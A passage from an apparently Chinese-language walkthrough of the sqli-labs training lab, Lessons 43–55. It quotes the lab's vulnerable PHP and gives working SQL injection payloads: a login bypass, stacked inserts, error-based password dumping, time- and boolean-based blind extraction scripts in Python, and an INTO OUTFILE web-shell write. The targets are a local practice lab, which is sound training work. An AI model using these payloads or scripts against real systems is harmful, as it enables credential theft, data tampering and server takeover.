<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line">	 <span class="keyword">if</span>($row = @mysqli_fetch_row($result))</span><br><span class="line">	 &#123;</span><br><span class="line">	    <span class="keyword">if</span> ($row[<span class="number">1</span>])</span><br><span class="line">	    &#123;</span><br><span class="line">	       <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	 &#125;</span><br></pre></td></tr></table></figure>
<p>构成了盲注</p>
<p>可以使用同样的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=test&amp;login_password=1&apos;;insert into users values(111,&apos;less43&apos;,&apos;less43&apos;)%23</span><br></pre></td></tr></table></figure>
<p>查看数据库</p>
<p><img src="\img\images\sqli-lib\1569895589260.png" alt="1569895589260"></p>
<p>这里还可以使用万能密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=test&amp;login_password=1&apos; or 1%23</span><br></pre></td></tr></table></figure>
<p>成功登陆</p>
<p><img src="\img\images\sqli-lib\1569895536153.png" alt="1569895536153"></p>
<h2 id="Less-45-Stacked-injection"><a href="#Less-45-Stacked-injection" class="headerlink" title="Less-45 Stacked injection"></a>Less-45 Stacked injection</h2><p>这里和Less-43一致，就如同less44与less42一样是一个盲注，没有报错信息</p>
<p>构造payload插入数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=test&amp;login_password=1&apos;);insert into users values(113,&apos;less45&apos;,&apos;less45&apos;)%23</span><br></pre></td></tr></table></figure>
<p>查看数据库</p>
<p><img src="\img\images\sqli-lib\1569895725146.png" alt="1569895725146"></p>
<p>插入成功</p>
<h2 id="Less-46-order-by-后的注入"><a href="#Less-46-order-by-后的注入" class="headerlink" title="Less-46 order by 后的注入"></a>Less-46 order by 后的注入</h2><p>在order by 后的注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br></pre></td></tr></table></figure></p>
<p><strong>order by 后的注入流程</strong></p>
<p>判断注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-46/?sort=1 asc</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-46/?sort=1 desc</span><br></pre></td></tr></table></figure>
<p>输入<code>asc</code>和<code>desc</code>查看有无变化，如果有变化说明存在注入，其中<code>asc</code>表示升序排列，<code>desc</code>表示降序排列</p>
<p>我们接下来可以使用报错注入来进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-46/?sort=0 or updatexml(1,concat(&apos;~&apos;,(select(group_concat(id,username,password))from(users))),0)%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569911240212.png" alt="1569911240212"></p>
<p>基于时间的盲注</p>
<p>如果在后面直接<code>and if(1=1,sleep(2),1)</code>，sleep的时间会是 <code>2*数据集个数的时间</code>，这里可以使用<code>sleep(0.1)</code>或者<code>sleep(0.01)</code>的方式，根据实际数据情况来考虑延时的时间。</p>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-46/?sort=0 or if(length(database())=8,sleep(0.1),1)%23</span><br></pre></td></tr></table></figure>
<p>还可以利用<code>rand()</code>函数来进行布尔盲注</p>
<p>rand()是一个随机函数</p>
<p>当<code>rand(true)</code>和<code>rand(flase)</code>时，值是固定的</p>
<p><img src="\img\images\sqli-lib\1569926349639.png" alt="1569926349639"></p>
<p>可以利用该特性进行构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-46/?sort=rand(length(database())=8)%23</span><br></pre></td></tr></table></figure>
<h2 id="Less-47-order-by-后的注入"><a href="#Less-47-order-by-后的注入" class="headerlink" title="Less-47 order by 后的注入"></a>Less-47 order by 后的注入</h2><p>这里相比less-46只是进行了sql语句拼接的修改</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY '$id'"</span>;</span><br></pre></td></tr></table></figure>
<p>构造报错注入payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-47/?sort=0&apos; or updatexml(1,concat(&apos;~&apos;,(select(group_concat(id,username,password))from(users))),0)%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569919152049.png" alt="1569919152049"></p>
<h2 id="Less-48-order-by后的注入"><a href="#Less-48-order-by后的注入" class="headerlink" title="Less-48 order by后的注入"></a>Less-48 order by后的注入</h2><p>这里在sql语句拼接做了修改的同时，取消了<code>print_r(mysql_error());</code>输出，导致了我们没有办法采用报错注入，只能使用盲注了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br><span class="line">	$result = mysql_query($sql);</span><br><span class="line">	<span class="keyword">if</span> ($result)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">while</span> ($row = mysql_fetch_assoc($result))</span><br><span class="line">			&#123;</span><br><span class="line">    			<span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span>.$row[<span class="string">'id'</span>].<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">    			<span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span>.$row[<span class="string">'username'</span>].<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">    			<span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span>.$row[<span class="string">'password'</span>].<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">			&#125;			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-47.jpg" /&gt;&lt;br&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Lesson Concept and code Idea by &lt;b&gt;D4rk&lt;/b&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用基于布尔的盲注</p>
<p>这里直接放脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs/Less-48/?sort="</span></span><br><span class="line">trueString = <span class="string">"""&lt;tr&gt;&lt;td&gt;11&lt;/td&gt;&lt;td&gt;admin3&lt;/td&gt;&lt;td&gt;admin3&lt;/td&gt;&lt;/tr&gt;&lt;/font&gt;&lt;font color= "#00FF11" size="3"&gt;&lt;tr&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;stupid&lt;/td&gt;&lt;td&gt;stupidity&lt;/td&gt;&lt;/tr&gt;"""</span></span><br><span class="line"><span class="comment">#判断数据库长度</span></span><br><span class="line">dbLen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    dbLen += <span class="number">1</span></span><br><span class="line">    req_url = url + <span class="string">"rand(length(database())=&#123;0&#125;)%23"</span>.format(str(dbLen))</span><br><span class="line">    print(req_url)</span><br><span class="line">    res = requests.get(req_url).text</span><br><span class="line">    <span class="keyword">if</span> trueString <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"database_lengh:"</span>,dbLen)</span><br><span class="line"></span><br><span class="line"><span class="comment">#猜解数据库名</span></span><br><span class="line"></span><br><span class="line">db_name = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(dbLen):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        req_url = url + <span class="string">"rand(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;)%23"</span>.format(str(i+<span class="number">1</span>),str(c))</span><br><span class="line">        res = requests.get(req_url).text</span><br><span class="line">        print(req_url)</span><br><span class="line">        <span class="keyword">if</span> trueString <span class="keyword">in</span> res:</span><br><span class="line">            db_name += chr(c)</span><br><span class="line">            print(db_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"database:"</span>,db_name)</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569920880677.png" alt="1569920880677"></p>
<h2 id="Less-49-order-by后的注入"><a href="#Less-49-order-by后的注入" class="headerlink" title="Less-49 order by后的注入"></a>Less-49 order by后的注入</h2><p>这个同样是盲注，只是sql语句的拼接发生了变化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY '$id'"</span>;</span><br></pre></td></tr></table></figure>
<p>这里只能使用基于时间的盲注了，因为<code>order by &#39;&#39; or band(true)</code> 已经起不到作用了</p>
<p>并且order by 后面跟的 sleep()语句每条数据都会sleep()一次，这里同样选取合适的时间来进行注入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs/Less-49/?sort=0"</span></span><br><span class="line"></span><br><span class="line">dbLen = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    dbLen +=<span class="number">1</span></span><br><span class="line">    reqUrl = url +<span class="string">"' or if(length(database())=&#123;0&#125;,sleep(0.2),1)%23"</span>.format(dbLen)</span><br><span class="line">    print(reqUrl)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    res = requests.get(reqUrl)</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(end_time - start_time)</span><br><span class="line">    <span class="keyword">if</span> (end_time - start_time) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">print(<span class="string">"dbLen"</span>,dbLen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#猜解数据库名</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(dbLen):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        reqUrl = url +<span class="string">"' or if(ascii(mid((database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(0.2),1)%23"</span>.format(str(i+<span class="number">1</span>),str(c))</span><br><span class="line">        print(reqUrl)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.get(reqUrl)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> (end_time - start_time) &gt; <span class="number">2</span>:</span><br><span class="line">            flag += chr(c)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">print(<span class="string">'data:'</span>,flag)</span><br></pre></td></tr></table></figure>
<p>这里还可以使用outfile注入(需要权限支持)，直接导出php一句话木马</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-49/?sort=0&apos; into outfile &apos;/var/www/html/shell.php&apos; lines terminated by 0x(webshell的hex)</span><br></pre></td></tr></table></figure>
<p>其中<code>lines terminates by</code>将每行以指定字符串结尾</p>
<h2 id="Less-50-order-by-stacked-injection"><a href="#Less-50-order-by-stacked-injection" class="headerlink" title="Less-50 order by stacked injection"></a>Less-50 order by stacked injection</h2><p>这里使用了<code>mysqli_multi_query()</code>函数，支持多条语句同时执行，所以直接堆叠注入，我们开始order by 后面的堆叠注入，这里可以使用报错注入来查询数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-50/?sort=1;insert into users values(115,&apos;flag0&apos;,&apos;flag0&apos;)%23</span><br></pre></td></tr></table></figure>
<p>可以看到数据被成功插入</p>
<p><img src="\img\images\sqli-lib\1569930454686.png" alt="1569930454686"></p>
<h2 id="Less-51-order-by-stacked-injection"><a href="#Less-51-order-by-stacked-injection" class="headerlink" title="Less-51 order by stacked injection"></a>Less-51 order by stacked injection</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users ORDER BY '$id'"</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br></pre></td></tr></table></figure>
<p>less51与less50不同之处在于sql语句拼接，稍微修改payload即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-51/?sort=1&apos;;insert into users values(116,&apos;flag0-less51&apos;,&apos;flag0&apos;)%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569930631701.png" alt="1569930631701"></p>
<p>插入成功</p>
<h2 id="Less-52-order-by-stacked-injection"><a href="#Less-52-order-by-stacked-injection" class="headerlink" title="Less-52 order by stacked injection"></a>Less-52 order by stacked injection</h2><p>这里去掉了<code>print_r(mysqli_error($con1));</code>，导致了我们不能使用报错注入，只可以使用盲注，其余的和less50是一样的，这里我们可以直接用less50的payload进行注入。</p>
<h2 id="Less-53-order-by-stacked-injection"><a href="#Less-53-order-by-stacked-injection" class="headerlink" title="Less-53 order by stacked injection"></a>Less-53 order by stacked injection</h2><p>这里同样是去掉了报错函数，sql语句拼接和Less-51一致，直接沿用Less-51的payload即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-53/?sort=1&apos;;insert into users values(117,&apos;flag0-less53&apos;,&apos;flag0&apos;)%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569931479448.png" alt="1569931479448"></p>
<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'answer_key'</span>]))<span class="comment">//未设置answer_key参数时</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset'</span>]))<span class="comment">//重置按钮被按下，将cookie设置为失效</span></span><br><span class="line">	&#123;</span><br><span class="line">		setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);<span class="comment">//cookie失效</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Redirecting you to main challenge page..........\n"</span>;</span><br><span class="line">		header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">		<span class="comment">//echo "cookie expired";	</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'challenge'</span>]))<span class="comment">//如果challenge被设置</span></span><br><span class="line">		&#123;</span><br><span class="line">			$sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span><span class="comment">//否则设置challenge</span></span><br><span class="line">		&#123;</span><br><span class="line">			$expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;<span class="comment">//当前时间+2592000</span></span><br><span class="line">			$hash = data($table,$col);<span class="comment">//取出该列的第一个字段的数据</span></span><br><span class="line">			setcookie(<span class="string">"challenge"</span>, $hash, $expire);<span class="comment">//设置cookie</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))<span class="comment">//id传参</span></span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			<span class="comment">//update the counter in database</span></span><br><span class="line">			next_tryy();<span class="comment">//尝试次数+1</span></span><br><span class="line">			</span><br><span class="line">			<span class="comment">//Display attempts on screen.</span></span><br><span class="line">			$tryyy = view_attempts();<span class="comment">//获取尝试次数</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"You have made : "</span>. $tryyy .<span class="string">" of $times attempts"</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">//Reset the Database if you exceed allowed attempts.</span></span><br><span class="line">			<span class="keyword">if</span>($tryyy &gt;= ($times+<span class="number">1</span>))<span class="comment">//如果尝试次数&gt;10,则设置cookie失效</span></span><br><span class="line">			&#123;</span><br><span class="line">				setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"Redirecting you to challenge page..........\n"</span>;</span><br><span class="line">				header( <span class="string">"refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">			&#125;	</span><br><span class="line">			<span class="comment">// Querry DB to get the correct output//否则进行sql语句拼接查询</span></span><br><span class="line">			$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;<span class="comment">//sql语句拼接</span></span><br><span class="line">			$result=mysql_query($sql);</span><br><span class="line">			$row = mysql_fetch_array($result);</span><br><span class="line">			<span class="keyword">if</span>($row)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;	</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> </span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//				print_r(mysql_error());</span></span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;"</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span><span class="comment">//对传入的key进行两次转义，对齐进行查询，来展示不同的页面</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;'</span>;</span><br><span class="line">	$key = addslashes($_POST[<span class="string">'key'</span>]);<span class="comment">//对key进行转义</span></span><br><span class="line">	$key = mysql_real_escape_string($key);<span class="comment">//再次进行转义</span></span><br><span class="line">	$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br><span class="line">	$result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error in submittion of Key Solution"</span>.mysql_error());</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="comment">//key正确后操作</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">        <span class="comment">//key错误后操作</span></span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果没有提交key值，则可以传入id参数进行sql查询，如果提交了key值到了else下面，则会判断key值是否正确，这次用的数据库换成了<code>challenges</code>，每次都会创建一个随机名的数据表和随机的key列名，你只有10次尝试机会，当10次机会结束之后，这个表就会被删除，重新创建，表名和列名也随之改变，获取到正确的key值提交即可过关。</p>
<p><strong>下面进行攻击</strong></p>
<p>获取数据库名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-54/?id=1&apos; and 1=2 union select 1,database(),3%23</span><br></pre></td></tr></table></figure>
<p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-54/?id=1&apos; and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569981227704.png" alt="1569981227704"></p>
<p>这里的表名，在cookie周期内有效，下一个周期就会发生改变</p>
<p>获取列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-54/?id=1&apos; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;wab2jx4fci&apos;%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569981358720.png" alt="1569981358720"></p>
<p>其中的<code>secret_063c</code>同样在下一个cookie周期会发生改变</p>
<p>获取key值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-54/?id=1&apos; and 1=2 union select 1,group_concat(id,0x7e,sessid,0x7e,secret_063C,0x7e,tryy),3 from wab2jx4fci%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569981465235.png" alt="1569981465235"></p>
<p>提交key值即可过关</p>
<p><img src="\img\images\sqli-lib\1569981516255.png" alt="1569981516255"></p>
<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$times= <span class="number">14</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=($id) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>Less-55相比较Less-54 发生变化的地方在于，尝试次数变成了14次，sql语句拼接发生了变化</p>
<p>稍微修改攻击payload即可</p>
<p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-55/?id=1) and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>
<p>获取列名</p>
